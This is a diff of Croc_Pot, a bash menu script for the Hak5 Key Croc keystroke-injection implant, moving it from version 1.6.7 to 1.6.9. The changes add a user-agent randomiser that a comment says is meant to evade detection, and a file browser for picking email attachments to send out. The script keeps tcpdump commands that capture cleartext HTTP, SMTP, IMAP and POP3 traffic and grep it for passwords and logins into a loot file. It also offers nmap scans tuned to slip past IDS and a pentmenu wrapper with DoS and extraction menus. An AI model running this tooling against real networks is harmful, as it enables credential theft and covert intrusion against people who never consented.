@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.6.7
+# Version:       1.6.9
 # Category:      Key Croc
 ##
 ##
@@ -95,6 +95,7 @@ function Info_Screen() {
 #----Croc_Pot title function
 ##
 function croc_title() {
+	user_agent_random
 	local k_b=$(awk -v m=24 '{printf("%-24s\n", $0)}' <<< $(lsusb | sed -n '/Linux Foundation\|Realtek Semiconductor/!p' | sed 's/^.*ID/ID/' | sed 's/ID//' | sed 's/,//' | awk '{print $1,$2}'))
 ##
 #----Test internet connection
@@ -111,11 +112,12 @@ fi
 #----Croc_Pot title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
-${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.6.7${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
-${blue}DEVELOPED BY ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=16 '{printf("%-16s\n", $0)}' <<< $(uptime -p | sed 's/up/UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) ${clear}${cyan}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
-${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< $(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone))${clear}${cyan} $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} keyboard:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b}${clear}
+${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.6.9${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
+${blue}AUTHOR: ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< $(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) ${clear}${cyan}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
+${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< $(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone))${clear}${cyan} $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} keyboard:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b}${clear}
 \e[40;38;5;202m»»»»»»»»»»»» ${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m «««««««««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU  TEMP:${clear}${cyan}$(cat /sys/class/thermal/thermal_zone0/temp)°C${clear}${yellow} USAGE:${clear}${cyan}$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'))${clear}${yellow}MEM:${clear}${cyan}$(awk -v m=8 '{printf("%-8s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"
+sleep 1
 }
 ##
 #----Croc_Pot title for loot
@@ -311,6 +313,31 @@ done
 	echo -ne "${clear}"
 }
 ##
+#----Random the user-agent to help avoid detection on some recon scan
+##
+function user_agent_random() {
+	userAgentList=(
+"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
+"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
+"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
+"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"
+"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152;"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
+"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20061201 Firefox/2.0.0.17 (Ubuntu-feisty)"
+"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B367"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR"
+"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 1.1.4322; InfoPat"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
+)
+userAgent="${userAgentList[ $(expr $(( $RANDOM )) \% ${#userAgentList[*]}) ]}"
+}
+##
 #----KeyCroc Log mean/function
 ##
 function croc_logs_mean() {
@@ -357,10 +384,12 @@ function croc_mail() {
 	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
 	LED B
 	echo -ne "$(Info_Screen '
--Send E-Mail with gmail or OutLook
+-Send E-Mail with gmail or OutLook with python script
 -Select gmail or outlook then Enter e-mail address
 -Enter e-mail password then Enter the e-mail to send to
--Add MESSAGE and/or Add Attachment')\n\n"
+-Add MESSAGE and/or Add Attachment
+-This will create python script save to tools/Croc_Pot
+-May need to adjust e-mail account settings')\n\n"
 ##
 #----User Smtp Menu input Function
 ##
@@ -412,6 +441,9 @@ fi
 #----Mail user enter path to Attachment Function
 ##
 send_file_e() {
+	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
+	read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+	f=`find /${r_f} -type f -name "*.*"` ; echo -ne "${green}${f}${clear}\n"
 	read_all ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER] ; s_a=${r_a}
 if [ -e "${s_a}" ]; then
 	local CHANGE_FILE="P"
@@ -581,16 +613,16 @@ MenuTitle TCPDUMP SCAN MENU ; MenuColor 25 1 INTERFACE SCAN ; MenuColor 25 2 PAC
 MenuColor 25 5 CHECK HOST COMMUNICATION ; MenuColor 25 6 TCP PACKET HTTP REQUEST ; MenuColor 25 7 PACKET OF TCP,UDP,ICMP ; MenuColor 25 8 HOST HEADER HTTP ; MenuColor 25 9 DNS QUERY REQUEST
 MenuColor 24 10 ENTER AN TCPDUMP SCAN ; MenuColor 24 11 RETURN TO MAIN MENU ; MenuEnd 28
 	case $m_a in
-	1) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}INTERFACE SCAN${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -D >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	2) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKETS IN HEX AND ASCll${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -XX -i any >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	3) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKETS WITH IP ADDRESS${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -n -i any >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	4) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}CURRENT NETWORK INTERFACE${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	5) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}CHECK HOST COMMUNICATION${LINE_}\n" >> ${LOOT_TCPDUMP} ; read_all ENTER IP AND PRESS [ENTER] && tcpdump -i any src host ${r_a} >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	6) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}TCP PACKET HTTP REQUEST${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -i any port http >> ${LOOT_TCPDUMP} & tcpdump -i any port 80 >> ${LOOT_TCPDUMP} & tcpdump -A -s 1492 dst port 80 or -A -s 1492 src port 80 >> ${LOOT_TCPDUMP} & tcpdump -i any port http or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user ' >> ${LOOT_TCPDUMP} & tail -f ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	7) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKET OF TCP,UDP,ICMP${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -n -v tcp or udp or icmp and not port 22 >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	8) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}HOST HEADER HTTP${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -i any -n -s 0 -w - | grep -a -o -E --line-buffered "GET \/.*|Host\: .*" >> ${LOOT_TCPDUMP} & tail -f ${LOOT_TCPDUMP} && tcpdump_scan ;;
-	9) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}DNS QUERY REQUEST${LINE_}\n" >> ${LOOT_TCPDUMP} ; tcpdump -i any 'udp port 53' >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	10) rm ${LOOT_TCPDUMP} 2> /dev/null ; croc_title_loot > ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}TCPDUMP SCAN${LINE_}\n" >> ${LOOT_TCPDUMP} ; read_all ENTER TCPDUMP SCAN THEN PRESS [ENTER] && ${r_a} >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	1) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -D | tee -a ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	2) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKETS IN HEX AND ASCll${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -XX -i any | tee -a ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	3) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKETS WITH IP ADDRESS${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -n -i any >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	4) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}CURRENT NETWORK INTERFACE${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	5) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}CHECK HOST COMMUNICATION${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; read_all ENTER IP AND PRESS [ENTER] && tcpdump -i any src host ${r_a} >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	6) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}TCP PACKET HTTP REQUEST${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -i any port http >> ${LOOT_TCPDUMP} & tcpdump -i any port 80 >> ${LOOT_TCPDUMP} & tcpdump -A -s 1492 dst port 80 or -A -s 1492 src port 80 >> ${LOOT_TCPDUMP} & tcpdump -i any port http or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user ' >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	7) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}PACKET OF TCP,UDP,ICMP${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -n -v tcp or udp or icmp and not port 22 >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	8) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}HOST HEADER HTTP${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -i any -n -s 0 -w - | grep -a -o -E --line-buffered "GET \/.*|Host\: .*" >> ${LOOT_TCPDUMP} & tail -f ${LOOT_TCPDUMP} && tcpdump_scan ;;
+	9) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}DNS QUERY REQUEST${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; tcpdump -i any 'udp port 53' >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	10) croc_title_loot | tee ${LOOT_TCPDUMP} ; echo -e "\n\t${LINE_}TCPDUMP SCAN${LINE_}\n" | tee -a ${LOOT_TCPDUMP} ; read_all ENTER TCPDUMP SCAN THEN PRESS [ENTER] && ${r_a} >> ${LOOT_TCPDUMP} ; cat ${LOOT_TCPDUMP} ; tcpdump_scan ;;
 	11) main_menu ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; tcpdump_scan ;;
 	esac
 }
@@ -647,7 +679,7 @@ MenuColor 20 6 INTERFACE SCAN ; MenuColor 20 7 PORT SCAN ; MenuColor 20 8 PERSON
 	esac
 }
 ##
-#----start all scan Function
+#----Recon start all scan Function
 ##
 scan_all() {
 	read_all START SCAN Y/N AND PRESS [ENTER]
@@ -677,7 +709,8 @@ traceroute_scan() {
 whois_scan() {
 	clear
 	echo -ne "$(Info_Screen '
--Whois Lookup scan enter IP or web site name')\n\n"
+-Whois Lookup scan enter IP or web site name
+-Requirements: WHOIS')\n\n"
 	install_package whois WHOIS whois_scan croc_recon
 	scan_all whois_scan whois
 }
@@ -687,7 +720,8 @@ whois_scan() {
 dns_scan() {
 	clear
 	echo -ne "$(Info_Screen '
--DNS Lookup scan enter IP or web site name')\n\n"
+-DNS Lookup scan enter IP or web site name
+-Requirements: DNSUTILS')\n\n"
 	install_package dnsutils DNSUTILS dns_scan croc_recon
 	scan_all dns_scan dig
 }
@@ -716,7 +750,7 @@ target_port() {
 	read_all ENTER PORT RANGE FOR SCAN AND PRESS [ENTER] ; range_port=${r_a}
 	local broken=0
 break_script() {
-	local broken=1
+	broken=1
 }
 	trap break_script SIGINT
 for (( PORT = 1; PORT < $range_port; ++PORT )); do
@@ -741,7 +775,8 @@ ssl_scan() {
 	clear
 	echo -ne "$(Info_Screen '
 -Scanning TLS/SSL configuration with SSLscan
--SSLscan is a command-line tool example: sslscan google.com:443')\n\n"
+-SSLscan is a command-line tool example: sslscan google.com:443
+-Requirements: SSLSCAN')\n\n"
 	install_package sslscan SSLSCAN ssl_scan croc_recon
 	scan_all ssl_scan sslscan --no-failed
 }
@@ -752,28 +787,9 @@ phone_lookup() {
 	echo -ne "$(Info_Screen '
 -Phone number lookup 555-555-5555
 -curl https://www.phonelookup.com')\n\n"
-	local userAgentList=(
-"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
-"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
-"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
-"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"
-"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
-"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"
-"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152;"
-"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
-"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20061201 Firefox/2.0.0.17 (Ubuntu-feisty)"
-"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B367"
-"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
-"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR"
-"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
-"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR"
-"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 1.1.4322; InfoPat"
-"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
-)
-local userAgent="${userAgentList[ $(expr $RANDOM \% ${#userAgentList[*]}) ]}"
+user_agent_random
 read_all ENTER PHONE NUMBER TO LOOKUP AND PRESS [ENTER]
-curl -sk https://www.phonelookup.com/1/${r_a} -A "$userAgent" | grep -e "h[14]" | head -n14 | sed -e "s/^\s*//" -e "s/\s*$//" -e "s/<[^>]*>//g" | sed '1c\ ' #-e "s/^.*:\s//"
+curl -sk -A "$userAgent" https://www.phonelookup.com/1/${r_a} | grep -e "h[14]" | head -n14 | sed -e "s/^\s*//" -e "s/\s*$//" -e "s/<[^>]*>//g" | sed '1c\ '
 }
 ##
 #----Recon check dns leak test
@@ -802,7 +818,8 @@ fi
 	increment_error_code
 }
 check_internet_connection() {
-	curl -k --silent --head  --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
+	user_agent_random
+	curl -k -A "$userAgent" --silent --head --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
 if [ $? -ne 0 ]; then
 	echo_error "No internet connection."
 	$error_code
@@ -905,7 +922,8 @@ fi
 	increment_error_code
 }
 check_internet_connection() {
-	curl -k --silent --head  --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
+	user_agent_random
+	curl -k -A "$userAgent" --silent --head  --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
 if [ $? -ne 0 ]; then
 	echo_error "No internet connection."
 	$error_code
@@ -994,11 +1012,10 @@ print_servers "conclusion"
 ##
 pentmenu() {
 	echo -ne "$(Info_Screen '
--Welcome to pentmenu!
+-Welcome to pentmenu! Big thanks to Chris Spillane - GinjaChris
 -This software is only for responsible, authorised use.
 -YOU are responsible for your own actions!
 -Readme:https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md
--Big thanks to Chris Spillane - GinjaChris
 -Requirements:bash, curl, netcat, hping3 or nping, openssl, stunnel,
 -nmap, whois, dnsutils, ike-scan')\n\n"
 install_package whois WHOIS pentmenu
@@ -1008,54 +1025,55 @@ install_package dnsutils DNSUTILS pentmenu
 #install_package stunnel STUNNEL pentmenu
 install_package ike-scan IKE-SCAN pentmenu
 ##
-#----pentmenu main menu
+#----Recon pentmenu main menu
 ##
 mainmenu() {
-MenuTitle PENTMENU MAIN MENU ; MenuColor 20 1 RECON MENU ; MenuColor 20 2 DOS MENU ; MenuColor 20 3 EXTRACTION MENU ; MenuColor 20 4 VIEW README ; MenuColor 20 5 RETURN TO MAIN MENU ; MenuEnd 23
+MenuTitle PENTMENU MAIN MENU ; MenuColor 20 1 PENTMENU RECON MENU ; MenuColor 20 2 PENTMENU DOS MENU ; MenuColor 20 3 EXTRACTION MENU ; MenuColor 20 4 VIEW README ; MenuColor 20 5 RETURN TO MAIN MENU ; MenuEnd 23
 	case $m_a in
 	1) reconmenu ;; 2) dosmenu ;; 3) extractionmenu ;; 4) showreadme ;; 5) main_menu ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; mainmenu ;;
 	esac
 }
 ##
-#----Recon menu
+#----Recon pentmenu recon menu
 ##
 reconmenu() {
-MenuTitle RECON SCAN MENU ; MenuColor 20 1 SHOW IP ; MenuColor 20 2 DNS RECON ; MenuColor 20 3 PING SWEEP ; MenuColor 20 4 QUICK SCAN ; MenuColor 20 5 DETAILED SCAN
+MenuTitle PENTMENU RECON SCAN MENU ; MenuColor 20 1 SHOW IP ; MenuColor 20 2 DNS RECON ; MenuColor 20 3 PING SWEEP ; MenuColor 20 4 QUICK SCAN ; MenuColor 20 5 DETAILED SCAN
 MenuColor 20 6 UDP SCAN ; MenuColor 20 7 CHECK SERVER UPTIME ; MenuColor 20 8 IPsec SCAN ; MenuColor 20 9 RETURN TO MAIN MENU ; MenuEnd 23
 	case $m_a in
-	1) showip ; reconmenu;; 2) dnsrecon ; reconmenu;; 3) pingsweep ; reconmenu;; 4) quickscan ; reconmenu;; 5) detailedscan ; reconmenu;; 6) udpscan ; reconmenu;; 7) checkuptime ; reconmenu;; 8) ipsecscan ; reconmenu;; 9) mainmenu ;; 0) exit 0 ;; [bB]) mainmenu ;; *) invalid_entry ; reconmenu ;;
+	1) showip ; reconmenu ;; 2) dnsrecon ; reconmenu ;; 3) pingsweep ; reconmenu ;; 4) quickscan ; reconmenu ;; 5) detailedscan ; reconmenu ;; 6) udpscan ; reconmenu ;; 7) checkuptime ; reconmenu ;; 8) ipsecscan ; reconmenu ;; 9) mainmenu ;; 0) exit 0 ;; [bB]) mainmenu ;; *) invalid_entry ; reconmenu ;;
 	esac
 }
 ##
-#----input Target ip/host
+#----Recon pentmenu input Target ip/host
 ##
 target_input() {
 	read_all Please enter the target hostname or IP ; TARGET=${r_a}
 }
 ##
-#----input Target port
+#----Recon pentmenu input Target port
 ##
 target_input_port() {
 	read_all Enter port default is 80 ; PORT=${r_a}
 }
 ##
-#----START SHOW IP
+#----Recon pentmenu START SHOW IP
 ##
 showip() {
 echo -ne "$(Info_Screen '
 External IP lookup uses curl...')\n\n"
+user_agent_random
 #---use curl to lookup external IP
-echo -ne "${yellow}External IP is detected as:${clear} " ; curl https://icanhazip.com/s/
+echo -ne "${yellow}External IP is detected as:${clear} " ; curl -A "$userAgent" https://icanhazip.com/s/
 #----show interface IP's
 echo -ne "\n${yellow}Interface IP's are:${clear}\n"
-ip a | grep inet
+	ip a | grep inet
 #----if ip a command fails revert to ifconfig
 if ! [[ $? = 0 ]]; then
 	ifconfig | grep inet
 fi
 }
 ##
-#----START DNS RECON
+#----Recon pentmenu START DNS RECON
 ##
 dnsrecon() {
 echo -ne "$(Info_Screen '
@@ -1072,12 +1090,13 @@ fi
 sleep 1 && whois -H $TARGET
 if ! [[ $? = 0 ]]; then
 #----if whois fails, do a curl lookup to ipinfo.io
-	sleep 1 && curl ipinfo.io/$TARGET
+	user_agent_random
+	sleep 1 && curl -A "$userAgent" ipinfo.io/$TARGET
 fi
 reconmenu
 }
 ##
-#----START PING SWEEP
+#----Recon pentmenu START PING SWEEP
 ##
 pingsweep() {
 echo -ne "$(Info_Screen '
@@ -1088,7 +1107,7 @@ target_input
 nmap -sP -PE $TARGET --reason
 }
 ##
-#----START QUICK SCAN
+#----Recon pentmenu START QUICK SCAN
 ##
 quickscan() {
 echo -ne "$(Info_Screen '
@@ -1099,13 +1118,13 @@ target_input
 #----How fast should we scan the target?
 #----Faster speed is more likely to be detected by IDS, but is less waiting around
 echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
-Slower scans are more subtle, but faster means less waiting around.\n${clear}"
+Slower scans are more subtle, but faster means less waiting around.${clear}\n"
 read_all Default is 3 ; SPEED=${r_a}
 : ${SPEED:=3}
 nmap -Pn -sS -T $SPEED $TARGET --reason
 }
 ##
-#----START DETAILED SCAN
+#----Recon pentmenu START DETAILED SCAN
 ##
 detailedscan() {
 echo -ne "$(Info_Screen '
@@ -1116,14 +1135,15 @@ target_input
 #----How fast should we scan the target?
 #----Faster speed is more likely to be detected by IDS, but is less waiting around
 echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
-Slower scans are more subtle, but faster means less waiting around.\n${clear}"
+Slower scans are more subtle, but faster means less waiting around.${clear}\n"
 read_all Default is 3 ; SPEED=${r_a}
 : ${SPEED:=3}
 #----scan using nmap.  Note the change in user-agent from the default nmap value to help avoid detection
-nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
+user_agent_random
+nmap -script-args http.useragent="$userAgent" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
 }
 ##
-#----START UDP SCAN
+#----Recon pentmenu START UDP SCAN
 ##
 udpscan() {
 echo -ne "$(Info_Screen '
@@ -1133,14 +1153,14 @@ target_input
 #----How fast should we scan the target?
 #----Faster speed is more likely to be detected by IDS, but is less waiting around
 echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
-Slower scans are more subtle, but faster means less waiting around.\n${clear}"
+Slower scans are more subtle, but faster means less waiting around.${clear}\n"
 read_all Default is 3 ; SPEED=${r_a}
 : ${SPEED:=3}
 #----launch the scan using nmap
 nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
 }
 ##
